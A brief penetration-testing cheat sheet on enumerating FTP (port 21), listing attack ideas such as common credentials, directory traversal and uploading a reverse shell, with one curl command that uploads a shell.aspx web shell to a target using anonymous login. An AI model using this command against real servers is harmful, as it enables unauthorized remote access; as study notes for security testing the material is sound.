# Common Service Enumeration

## FTP (21)
- Commom Credentials
- File upload
- File download
- Upload Reverse Shell
- Directory Traversal

```
curl -T shell.aspx ftp://<ip address>/shell.aspx --user anonymous:guest
```